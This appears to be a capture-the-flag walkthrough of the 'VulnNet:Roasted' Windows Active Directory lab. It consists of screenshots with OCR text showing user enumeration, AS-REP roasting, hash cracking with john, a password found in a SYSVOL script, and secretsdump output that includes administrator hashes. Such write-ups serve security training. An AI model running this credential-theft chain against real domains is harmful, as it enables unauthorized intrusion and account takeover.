# VulnNet:Roasted (WINDOW AD)
19 June 2022
05:24 PM

<img src="VulnNetRoasted/media/image1.png"
style="width:5.20833in;height:2.61667in" />

<img src="VulnNetRoasted/media/image2.png"
style="width:5.2in;height:3.05in" />

<img src="VulnNetRoasted/media/image3.png"
style="width:5.18333in;height:2.31667in"
alt="version: VI. 0.3 (9dad6e1) (kali@ —/Down10ads $ ./kerbrute userenum vulnnet-rst. local --dc -d 07:29. 07 •.29. 07 •.30. 07:36. 07:36. vulnnet-rst.local userlist. txt - 06/19/22 - Ronnie Flathers Oropnop 2022/06/19 2022/06/19 2022/06/19 2022/06/19 2022/06/19 2022/06/19 &gt; Using KDC(s): vulnnet-rst. local : 88 •55 •28 • 12 •13 VALID VALID VALID VALID USERNAME : USERNAME : USERNAME : USERNAME : guestövulnnet-rst . local administratorövulnnet-rst . local Guestövulnnet-rst . local Administratoravulnnet-rst . local " />

<img src="VulnNetRoasted/media/image4.png"
style="width:5.16667in;height:2.69167in" />

<img src="VulnNetRoasted/media/image5.png"
style="width:5.075in;height:1.2in"
alt="—/Down10ads] smbmap -H 10.10.33.13 guest -u [+] IP: 10.10.33.13:445 Name: 10.10.33.13 Disk ADMIN$ c$ IPC$ NETLOGON SYSVOL vulnNet-Business-Anonymous VulnNet-Enterprise-Anonymous permissions NO ACCESS NO ACCESS READ ONLY NO ACCESS NO ACCESS READ ONLY NO ACCESS comment Remote Admin Default share Remote IPC Logon server share Logon server share vulnNet Business Sharing VulnNet Enterprise Sharing " />

<img src="VulnNetRoasted/media/image6.png"
style="width:5in;height:1.925in"
alt="kaliS kali [—/Down10ads ] smbclient -L 10.10. 126.157 Enter WORKGROUP\kali&#39;s password: Sharename ADMIN$ c$ IPC$ NETLOGON SYSVOL Type Disk Disk IPC Disk Disk Comment Remote Admin Default share Remote IPC Logon server share Logon server share vulnNet-Business-Anonymous Disk vulnNet Business Sharing VulnNet-Enterprise-Anonymous Disk VulnNet Enterprise Sharing Reconnecting with SMBI for workgroup listing. do_connect: Connection to 10.10.126.157 failed (Error Unable to connect with SMBI no workgroup available " />

<img src="VulnNetRoasted/media/image7.png"
style="width:5.00833in;height:2.65833in"
alt="Try &quot;help&quot; smb: Is H kali@ kali —/Down10ads] smbclient Enter WORKGROUP\ka1i&#39;s password: • 40 202 • 40 202 to get a list of possible commands. Business-Manager.txt Business-Sections . txt Business-Tracking. txt A 758 654 471 Fri Fri Thu Thu Thu Mar Mar Mar Mar Mar 12 12 11 11 11 • 46. 21. 21. 20:24:34 20: 24 8771839 blocks of size 4096. 4550147 blocks available smb: more Business-Manager.txt getting file \Business-Manager. txt of size 758 as /tmp/smbmore. BAKFV7 smb: \&gt; smbAC kali@ kali [—/Downtoads] smbmap -H 10.10. 126.157 202 202 202 (0. " />

<img src="VulnNetRoasted/media/image8.png"
style="width:4.96667in;height:3in"
alt="kaliS kali ) - [—/Down10ads] python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymousä)1ø.1ø.126.157 Impacket vø.1ø.1.dev1+2022ø606.123812.ac35841f - Copyright 2022 SecureAuth Corporation Password : Brute forcing SIDS at 10.10.126.157 StringBinding ncacn_np:1ø.1ø.126.157[\pipe\lsarpc] Domain SID is: S-1-5-21-1589833671-435344116-4136949213 498 513: 525 : : VULNNET- 500: VULNNET 501 : VULNNET 502: VULNNET 512: VULNNET VULNNET- 514: VULNNET 515: VULNNET 516: VULNNET 517: VULNNET 518: VULNNET- 519: VULNNET 520: VULNNET 521 : VULNNET 522: VULNNET VULNNET 526: VULNNET 527: VULNNET RST\Enterprise Read-only Domain Controllers (SidTypeGroup) -RST\Administrator (SidTypeUser) -RST\Guest (SidTypeUser) -RST\krbtgt (SidTypeuser) -RST\Domain Admins (SidTypeGroup) RST\Domain Users (SidTypeGroup) -RST\Domain Guests (SidTypeGroup) -RST\Domain Computers (SidTypeGroup) -RST\Domain controllers (SidTypeGroup) -RST\Cert Publishers (SidTypeAlias) RST\Schema Admins (SidTypeGroup) -RST\Enterprise Admins (SidTypeGroup) -RST\Group policy Creator Owners (SidTypeGroup) -RST\Read-only Domain controllers (SidTypeGroup) -RST\CIoneabIe Domain Controllers (SidTypeGroup) -RST\Protected Users (SidTypeGroup) -RST\Key Admins (SidTypeGroup) -RST\Enterprise Key Admins (SidTypeGroup) " />

user found

<img src="VulnNetRoasted/media/image9.png"
style="width:4.96667in;height:2.81667in"
alt="kali 9 kali [—/Down10ads] cat vunUse.txt krbtgt a-whitehat t-skid j -goldenhand j-leet " />

<img src="VulnNetRoasted/media/image10.png"
style="width:4.90833in;height:0.9in"
alt="kali S kali) -C —/Down10ads) python3 /usr/share/doc/python3-impacket/examples/GetNPUsers .py vulnnet-rst.local/ -usersfile vunUse. txt Impacket vø.1ø.1.dev1+20220606.123812.ac35841f - copyright 2022 secureAuth corporation [-] Kerberos sessionError: KDC ERR credentials have been revoked) [-] User a-whitehat doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set -no-pass 10.10.126.157 $krb5asrep$23$t-skidöVULNNET-RST. LOCAL f12ef637d09c717e88f726d39521db1daøee92de 5adcd6fe73f52b094ød7b174bf2fb715eec640øe80b1e9079bø58cb845cbe9718837632561øa5e73ø2743føaf4848eøaab42øa8f1286a336198b41ae76b96a90d7b517368867dc89c bf07a 7bafc5de8aabd81 7b 1 f69bbdøe8d74f2eca86b2f7cfceeae7f03ac6c523dOaf a5162339bbdc7cd1d870455eff9føc696554b4e8761e4øcf812ebc1235176d443c6øe59eb87b54feeefe978a81a16fa87a9a9d4f14c34539f8844ff59466c7765 [-] User j-goldenhand doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] user j-leet doesn&#39;t have set " />

<img src="VulnNetRoasted/media/image11.png"
style="width:4.91667in;height:1.2in"
alt="kaliS kali —/Downloads] sudo john --word list=/usr/share/wordlists/rockyou . txt hahs [sudo] password for kali: Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHAI A Will run 4 OpenMP threads press &#39;q&#39; or Ctrl-C to abort, almost any other key for status ( $krb5asrep$23$t-skidöVULNNET-RST. LOCAL) tj072889* lg DONE (2022-06-19 07:51) ø.2409g/s 765902p/s 765902C/s 765902C/s tj3929 tjø216044 &quot;—show&quot; option to display all of the cracked passwords reliably Use the Session completed. " />

tj072889\*

<img src="VulnNetRoasted/media/image12.png"
style="width:4.825in;height:1.19167in"
alt="kaliS kali [—/Down10ads] smbmap -H t-skid tjØ72889* 10.10.33.13 -u [+] IP: 10.10.33.13:445 Name: vulnnet-rst.local Disk ADMIN$ c$ IPC$ NETLOGON SYSVOL VulnNet-Business-Anonymous VulnNet-Enterprise-Anonymous permissions NO ACCESS NO ACCESS READ READ READ READ READ ONLY ONLY ONLY ONLY ONLY commen t Remote Admin Default share Remote IPC Logon server share Logon server share VulnNet Business Sharing VulnNet Enterprise Sharing " />

<img src="VulnNetRoasted/media/image13.png"
style="width:4.8in;height:3.375in"
alt="kaliS kali )- ] smbclient t-skid Enter WORKGROUP\t-skid&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: Is vulnnet-rst. local Dr Thu Mar 11 Thu Mar 11 14: 19:49 Thu Mar 11 14:19:49 4319097 blocks available 8540159 blocks of size 4096. smb: cd vulnnet-rst.local smb: \vulnnet-rst.local\&gt; Is DfsrPrivate Policies scripts DHSr D Thu Thu Thu Thu Tue Mar Mar Mar Mar Mar 11 11 11 11 16 14. 14. 19: • 40 • 40 15. • 49 8540159 blocks of size 4096. smb: cd scripts 4319047 blocks available smb: \vulnnet-rst.local\scripts\&gt; Resetpassword. vbs 8540159 blocks of smb: \vulnnet-rst.local\scripts\&gt; dir D size 4096. 1 0 2821 Tue Mar 16 19: 15: 49 Tue Mar 16 19:15:49 Tue Mar 16 19: 18: 14 2021 2021 2021 2021 2021 2021 2021 2021 2021 2021 2021 4305713 blocks available " />

<img src="VulnNetRoasted/media/image14.png"
style="width:4.80833in;height:3.54167in"
alt="constants for the NameTranslate object. Const ADS NAME INITTYPE GC = 3 const ADS NAME TYPE NT4 = 3 const = 1 If (Wscript .Arguments .Count 0 0) Then Wscript.Echo &quot;Syntax Error. Correct syntax is:&quot; Wscript.Echo &quot;cscript Resetpassword.vbs&quot; wscript . Quit struserNTName = &quot;a-whitehat&quot; End If strPassword = &quot; t&quot; bNdKVkjv3RR9h Determine DNS domain name from RootDSE object. set objR00tDSE = objR00tDSE. Get( &quot; defaultNamingcontext &quot; ) strDNSDomain = Use the NameTransIate object to find the NetBIOS domain nam DNS domain name. = CreateObject( &quot;NameTrans1ate&quot;) Set objTrans " />

bNdKVkjv3RR9ht

<img src="VulnNetRoasted/media/image15.png"
style="width:4.825in;height:1.23333in"
alt="(kali S kali)- [—/Downtoads] $ smbmap -H a-whitehat bNdKVkjv3RR9ht 10.10.33.13 -u -p [+] IP: 10.10.33.13:445 Name: vulnnet-rst.local [ / ] work[!] unable to remove test directory at \\1Ø.1Ø.33.13\SYSVOL\IJVLXGYCDZ, please remove manually Disk ADMIN$ c$ IPC$ NETLOGON SYSVOL vulnNet-Business-Anonymous VulnNet-Enterprise-Anonymous Permissions READ, WRITE READ, WRITE READ ONLY READ, WRITE READ, WRITE READ ONLY READ ONLY Commen t Remote Admin Default share Remote IPC Logon server share Logon server share vulnNet Business Sharing VulnNet Enterprise Sharing " />

<img src="VulnNetRoasted/media/image16.png"
style="width:4.80833in;height:1.3in"
alt="(kaliS —/Down10ads ] $ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9htö1ø.10.33.1 Impacket vø.1ø.1.dev1+2ø22ø6ø6.123812.ac35841f - Copyright 2022 SecureAuth Corporation [ * ] Service RemoteRegistry is in stopped state Starting service RemoteRegistry Target system bootKey: øxf1øa2788aef5f622149a41b2c745f49a Dumping local SAM hashes Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : c2597747aa5e43022a3a3049a3c3b09d : : : Guest : 501 : aad3b435b51404eeaad3b435b51404ee : 31d6cfeOd16ae931b73c59d7eøc089cø : : : DefaultAccount : 503 : aad3b435b514øoeeaad3b435b51404ee : 31d6cfeød16ae931b 73c59d7eøcø89cø : : : [-] SAM hashes extraction for user WDAGUtilitYAccount failed. The account doesn&#39;t have hash information. [ * ] Dumping cached domain logon information (domain/username:hash) Dumping LSA Secrets $MACHINE . ACC VULNNET-RST WIN-280BMIOEIM1 " />

<img src="VulnNetRoasted/media/image17.png"
style="width:4.78333in;height:2.66667in" />

<img src="VulnNetRoasted/media/image18.png"
style="width:4.75in;height:1.75833in"
alt="Info: Data: Info: PS C :\Users\legacyy\Downloads&gt; uploads /home/kali/Downloads/peas/winPEASx64.exe Uploading /home/kali/Downloads/peas/winPEASx64.exe to 2581844 bytes of 2581844 bytes copied Upload successful! PS dir Directory: C: Mode -a LastWriteTime 6/20/2022 6:26 PM Length Name 1916212 winPEAsx64.exe " />
